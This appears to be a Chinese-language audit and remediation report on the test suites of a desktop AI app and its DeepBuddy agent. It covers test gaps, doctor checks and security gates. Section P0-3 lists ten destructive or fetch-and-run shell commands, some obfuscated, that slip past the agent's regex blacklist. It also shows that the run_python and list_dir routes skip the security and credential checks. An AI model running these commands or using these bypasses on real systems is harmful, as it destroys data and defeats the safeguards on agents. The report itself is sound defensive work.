# 大肥鱼AI × DeepBuddy 测试体系漏洞审计（2026-11-20）

审计范围：大肥鱼AI（WebView2 主程序 / host 6800 / 内置 DSH 6811 / doctor / watchdog / 回归矩阵）与 DeepBuddy（deepbuddy.py 及其 6 个单元测试、可靠性脚本）。方法：通读测试断言与被测实现，对关键漏洞用**只调用判定函数、不执行真实命令**的方式复现（`D:\大肥鱼缓存\poc_test_gaps.py`）。

核心结论：现有「绿灯」高度集中在 **UI/DOM 壳层**，对真实主程序、真实对话、安全绕过与插件激活几乎没有硬门禁。doctor 全绿 ≠ 业务可用。

---

## P0 — 结构性盲区

### 1. 用户实际运行的 WebView2 主程序，零自动化回归
- `dsh_builtin_e2e.py` 用**独立 pywebview 窗口**，且 `js_api` 除 dsh_ui 外全部 stub 成 `{"ok":True}`，QQ/桌宠/provider/onebot 全是替身，只证明入口/iframe/品牌/启停这条 UI 壳。
- 唯一含真实流式对话的 `_qt_smoke.py` 测的是 **Qt 版（大肥鱼AI_Qt.py），另一套前端**，不是用户在用的 WebView2 版。
- 结果：真实主程序只能靠 CDP（会抢鼠标）或人工点验，没有可重复的回归。

### 2. 测试断言几乎全是 DOM 状态，无「真实对话→工具→模型」端到端
- 回归矩阵 `pw_regress_all.mjs` 13 项、e2e 10 项，全部是渲染/tab/开关/按钮/console error；没有一条断言「发一句话→模型返回→工具真实执行→结果正确」。
- 模型 429（code 1305）期间，所有绿灯都不代表对话可用——这正是历史「都交互不了」的根因，却没有任何测试能提前暴露。

### 3. 安全黑名单可 10/10 绕过（已 PoC）
DeepBuddy 自带 `SecurityPolicy.DANGER_PATTERNS` 是正则黑名单，`is_dangerous` 对以下全部返回 False：

```
rm -rf / ; del /f /s /q C:\Projects ; powershell -enc <base64> ;
iex (iwr http://x.ps1) ; d"i"skpart ; $a='disk';$b='part'; iex($a+$b) ;
taskkill /f /im explorer.exe ; wmic process call create ; git clean -fdx ; dd if=/dev/zero of=/dev/sda
```

- 检查只在 `run_shell/start_process` 生效；`check("run_python",{code:"...os.system('diskpart')"})` 直接返回 None（PoC），脚本解释器通道完全不设防。
- 对比：DSH 插件 `cc-safety-net` 是**语义解析**（强，已验证 6/6 拦截），但它只在 6811 运行时生效，**不保护 DeepBuddy**；DeepBuddy 实际依赖的是这份弱黑名单。

---

## P1 — 假阳性 / 绿灯陷阱

### 4. doctor `modules` 只看目录存在，不看能否激活
`check_modules()` 用 `os.path.isdir` 判定。目录在但代码损坏、依赖缺失、工具重名被拒载（历史 `bili_whoami` 冲突）时，仍输出「齐全」。

### 5. doctor 完全不覆盖非 `dsh-` 前缀插件（已 PoC）
`_expected_plugins()` 只收 `dsh-` 开头或 `dshmarket`。`cc-safety-net`、`billion-context`、`modlens` 等永远不在体检范围——目录被删、守卫失效，doctor 仍全绿。

### 6. SKIP 放行 + 退出码不阻断
- `test_deepbuddy_vendors.py`：真实 Ollama/GLM 链路失败走 `SKIP`，单元部分过即整体通过。
- `test_deepbuddy_cloud.py`：**没有断言机制**，只 print，退出码恒 0；云端列表为空、对话失败都算「成功」。
- `_reliability.py`：即使有 FAIL 项也不 `sys.exit(1)`，无法当 CI/值守门禁。

### 7. 凭证保护盲区（已 PoC）
- `list_dir` 不在 `_FILE_TOOLS`，列 `.ssh`/`.aws` 目录不经过安全门。
- 只取 basename 匹配：`.aws/config`、`.gnupg/pubring` 漏判；目录级敏感路径（`.aws`、`.gnupg`）覆盖不全。

---

## P2 — 测试方法论脆弱

### 8. 源码正则抽取 + exec 伪命名空间
`grab()` 从源码正则切函数体，exec 进手工拼装的命名空间，全局是伪造的，与真实运行时可能漂移；函数一旦改成 async/加装饰器/边界变化，可能静默测到旧片段。

### 9. mock 永远成功，错误路径几乎不覆盖
`MockRegistry.call` 恒返回 `RESULT_<name>`，不模拟失败/超时/大输出/异常；`MockRouter` 不模拟 429/空响应/截断/格式漂移。失败恢复、超时、输出截断路径无真实覆盖。

### 10. 进程/资源泄漏无断言
超时或 `stop` 后没有断言子进程真正消失（孙进程/孤儿）；后台进程的孤儿回收、输出缓冲、超长输出未测。

### 11. 抓图证据不可靠仍被使用
ImageGrab/PrintWindow 对 GPU 合成 WebView2 取白帧（历史已证），截图不能作验伪依据，应以 headless 渲染 + HTTP 校验为准。

### 12. watchdog 健康判定继承 doctor 盲区
`one_round` 的 `ok` 建立在 doctor 之上，继承 P1 全部盲区；且要求 6811 常驻在线，与「按需启停」设计存在张力（常驻 watchdog 会把 6811 一直拉起）。

---

## 修复优先级建议

| 序 | 动作 | 解决 |
| --- | --- | --- |
| 1 | 给 WebView2 真实主程序补一条可重复 e2e（固定调试端口、跑完即关），断言真实对话/工具/持久化 | P0-1/2 |
| 2 | DeepBuddy 用 `cc-safety-net` 同款语义引擎替换正则黑名单，或直接复用其 `checkCommand`；对所有命令类工具（含 python/node）统一过闸 | P0-3 |
| 3 | doctor `modules` 增加「激活态」校验（读运行时插件状态而非仅目录）；期望集去掉 `dsh-` 前缀限制 | P1-4/5 |
| 4 | 所有 `test_*` 强制 `sys.exit(1)` 于失败/跳过，禁止 SKIP 静默放行；给 cloud 脚本补断言 | P1-6 |
| 5 | 凭证保护改为路径规范化 + 目录级敏感清单，`list_dir` 纳入检查 | P1-7 |
| 6 | 引入故障注入（工具失败/超时/429/截断）的负面用例；进程停止后断言 PID 消失 | P2-9/10 |

PoC 脚本：`D:\大肥鱼缓存\poc_test_gaps.py`（无副作用，可重复运行）。

---

# 修复与复测（2026-11-20 当日）

审计结论已逐条落地为代码改动 + 可执行门禁，并用测试反证。分三档：已修并复测绿 / 已修但环境前置不满足（退出码 2） / 新发现并已修。

## 1. P0 安全引擎替换（已修，复测绿）

- 新增 `D:\DeepBuddy\cmd_guard.py`：语义判定替代正则黑名单。归一化（去引号 / 去 cmd `^` 转义 / 零宽字符 / 续行）→ 按 `; && || |` 分段 → 逐段特征判定，结论三档 `safe / confirm / danger`。
- 覆盖的历史绕过样本：`d"i"skpart`、`$a='disk';$b='part'; iex($a+$b)`、`powershell -enc`、`git clean -fdx`、`dd of=/dev/sda`、`taskkill /f /im explorer.exe`、`wmic process call create`、`del /f /s /q`、`certutil -urlcache`、`mshta javascript:` 等。
- 全部命令类工具统一过闸：`run_shell` / `start_process` 走 danger 硬拦 + confirm 询问；`run_python` / `run_node` / `run_js` 走 `analyze_code`（字符串字面量 + 危险 API）；`list_dir` 纳入凭证检查。
- `tool_registry.SecurityPolicy` 改为委托 `cmd_guard`，旧接口保持兼容。
- 复测：`test_cmd_guard.py` 53 断言全过；`test_security_gate.py`、`test_tool_registry.py`（23）、`test_deepbuddy_autoclaw.py`（25）全绿。

## 2. P1 doctor 体检（已修，复测绿）

- `_expected_plugins()` 去掉 `dsh-` 前缀过滤 → 期望集 22 个（含 `cc-safety-net`、`@vectorize-io/hindsight-coding-agents`）。
- 新增「加载态」校验 `_plugin_problems()`：目录、`package.json` 可解析、包名一致、`dsh` 插件标记、`main/exports` 入口文件存在、悬空链接识别。
- 新增 `check_builtin()`：`dist/index.html`、`dfy-override.js/.css`、`host.mjs`、内置 `node.exe`。
- `check_ports` 把 6811 空闲标注为「按需启动」，不再算故障。
- **关键新发现**：env `DSH_HOME=E:\DSH-home`，实际运行的 host 读的是 E 盘那套，doctor 原常量写死 `D:\本地部署大肥鱼环境\dsh`——之前体检的是「非运行中」的树。现已 `DEFAULT_DSH_HOME` + `LIVE_DSH_HOME` + `HOMES` 双 home 覆盖，`check_modules` 对两套都出结论。
- 新增第 8 项 `check_install_path()`：校验每个 home 的 `node_modules/.modules.yaml` 记录的 store/virtualStore 与 `pnpm-workspace.yaml` 配置是否同一套（不一致时 pnpm 直接 `ERR_PNPM_UNEXPECTED_STORE` 拒装）。
- 复测：8 项全绿；`test_doctor_gate.py` 全绿（含临时目录模拟六种破损）。

## 3. P1 凭证保护 + 退出码门禁（已修，复测绿）

- `cmd_guard.is_credential_path`：路径规范化（`~` 展开、`normpath`、分隔符统一）+ 目录级敏感清单（`.ssh .aws .gnupg .kube .azure .terraform .vault .password-store .docker`）+ basename 规则（`id_rsa/ed25519`、`pubring.gpg`、`known_hosts`、`.git-credentials`、`.pgpass`），词边界避免误伤 `tokenizer.py` / `config_loader.py`。
- 三个「假绿」脚本改为真模块导入 + 0/1/2 退出码语义：`test_deepbuddy_cloud.py`、`test_deepbuddy_vendors.py`、`_reliability.py`（后者补齐失败信号正则 + `sys.exit`）。`test_vendor_live.py` 也从「正则抠源码拼命名空间」改为真模块导入（原写法在深链上炸出 `_scan_tool_call is not defined`，外部看起来像模型坏了）。
- 复测：cloud / vendors / vendor_live 在「云端代理 11435 未运行」时统一 exit 2（未验证），不再静默放行；`_reliability` 15/16 + 1 SKIP → exit 2。

## 4. P2 故障注入 + 真机 e2e（部分完成）

- `agent_loop.py`：`router.chat` 异常重试 2 次后返回 error（原来直接崩栈）；`_dispatch` 工具异常吞成「工具执行异常」交回模型；`resp` 非 dict 归一。
- `deepbuddy.run_task`：指数退避重试（`MAX_API_RETRY=3`，2/4/8s 可中断退避）。
- 新增 `test_fault_injection.py`：12 断言（429 一次后恢复、持续失败不崩栈、空/None 响应、工具抛异常后继续、20 万字符大输出、后台进程 stop 后 PID 消失）。
- `dfy_dsh_watchdog.py`：6811 按需启停（`--ensure-ui` 才强制拉起）；`--once --no-fix` 返回 `host6800/hostPlugins/doctor` 结构化结论。
- WebView2 真机 e2e：`D:\大肥鱼缓存\test_real_webview_e2e.py` 探单实例互斥锁，主程序在跑时 exit 2「未验证」（不给假绿）。

## 5. 全量 sweep 中新发现并已修的真实产品问题

| # | 问题 | 证据 | 处置 |
| --- | --- | --- | --- |
| 1 | 前端调 `pywebview.api.open_external_url`，后端从未暴露（`test_api_wiring` 一直在红但无人当门禁） | `通过 18 项，失败 1 项` | `大肥鱼AI.py` 补 `open_external_url(url)`（仅放行 http/https）+ 加入 `window.expose(...)`；现 19/19 绿 |
| 2 | E 盘 live home 的 `dsh plugin add` 必挂：`node_modules/.modules.yaml` 记的是 C store + D virtualStore（整棵树是从 D 盘复制来的），而 `pnpm-workspace.yaml` 钉的是空的 E store | `ERR_PNPM_UNEXPECTED_STORE` | 把 `.modules.yaml` 对齐到 workspace 配置（E store + E virtualStore），树保持 hoisted/copy 布局；现 `dsh plugin add` 成功（`Done in 1.4s using pnpm v11.28.5`） |
| 3 | `pnpm-lock.yaml` 里 `dsh-qq-bridge` 的 integrity 与真实 tarball 不符（其余 4 个 github 包均对得上），任何安装都会 `ERR_PNPM_TARBALL_INTEGRITY` | 实测真实 sha512 = `0pVhZhj...`，锁文件写的是 `SMZSlZW3...` | 用实测值修正锁文件该条（真实内容是 GitHub 直连内容，非供应链篡改） |
| 4 | pnpm 只认 `dependencies`，会把宿主内置 bundle（`@deepseek-ai/dsh-base`、`dsh-web-app`、`dsh-qrcode`）当「野包」挪进 `.ignored`，宿主下次启动缺件 | `Moving ... to node_modules\.ignored\...` | `dfy_market.install()` 装完自动调用 `dfy_dsh_doctor.fix_modules()` 回收；doctor 的 `modules` 同时把它们列为可恢复项 |
| 5 | `dsh-ops` 在 E home 是悬空链接（目标 `D:\大肥鱼AI\dsh_host\pkgstage\node_modules\dsh-ops` 已不存在），`dsh-qrcode` 声明了但没装 | `悬空链接（目标目录已不存在）` | 清掉悬空链接并从 `package.json` 移除该依赖（备份 `.bak-auditfix`）；`dsh-qrcode` 从 D 树补齐 |
| 6 | `test_engine_integration` 的 `dsh-soul-md` 断言把具体版本号写死，且名称与逻辑相反（名说「已修正为 ^0.10.3」，逻辑禁的是 `^0.12.5`） | 上游已升到 `^0.12.5` 后长期红 | 改为真不变量：「caret 约束必须被实装版本满足」（^0.x 只允许同 minor） |

## 6. 复测矩阵（2026-11-20 最后一次全量）

- DeepBuddy：9 个 `test_*.py` 全 exit 0；`_reliability.py` 15/16 + 1 SKIP（llama.cpp 8080 未运行）→ exit 2 未验证。
- 大肥鱼AI `tools/` 全量 sweep（27 项）：**24 项 exit 0，0 项 exit 1（无失败），3 项 exit 2（前置不满足）**。
  - exit 2 = `test_deepbuddy_cloud` / `test_deepbuddy_vendors` / `test_vendor_live`，全部同一原因：本机兼容代理 11435 未运行。
  - 明细见 `D:\大肥鱼缓存\tools_test_sweep.json`。
- doctor：8 项全绿（`proxy / pnpm / store / allowbuilds / modules / installpath / ports / builtin`），双 home 插件 22 / 18 个齐全且可加载。
- watchdog：`--once --no-fix` → `host6800=true, hostPlugins=16, doctor=OK, ok=true`。
- 真机 6800 宿主在重装 node_modules 后正常拉起（5.2s），插件数由 15 → 16（`dsh-qrcode` 补齐后多加载一个）。

## 7. 仍属「未验证」而非「已通过」的项

- 云端链路（`test_deepbuddy_cloud`、`test_deepbuddy_vendors` 的 GLM 实测、`test_vendor_live` 的 GLM 实测）：本机兼容代理 11435 未运行 → 退出码 2。
- `_reliability` 的 llama.cpp 8080 链路：未运行 → SKIP。
- WebView2 真机 e2e：主程序在跑（单实例锁 + 6800/6811 占用），无法并发；需在关闭主程序后单独跑 `python D:\大肥鱼缓存\test_real_webview_e2e.py`。

## 8. 已知但刻意未改的两点

1. **pnpm 会驱逐内置 bundle**：`@deepseek-ai/dsh-base`、`@deepseek-ai/dsh-web-app`、`dsh-qrcode` 不在 `package.json` 的 `dependencies` 里（它们由构建阶段塞进 node_modules），所以每次 `pnpm add` 都会把它们挪进 `.ignored`。现已在 `_install_via_engine()` 末尾自动回收 + doctor `modules` 视为「可恢复」，但根治办法是让构建阶段把它们写成 `file:` 依赖——那会改动打包流程，留待单独排期。
2. **E 盘 live home 的 store 配置**：`pnpm-workspace.yaml` 钉 `E:\DSH-home\.pnpm-store\v11`，而 node_modules 实际来自 C store。已把 `.modules.yaml` 改成与 workspace 一致（E store），代价是后续 `pnpm install` 会从网络把包重新灌进 E store。若想彻底只用 E store，需在应用关闭时跑一次完整 `pnpm install` 预热 E store。


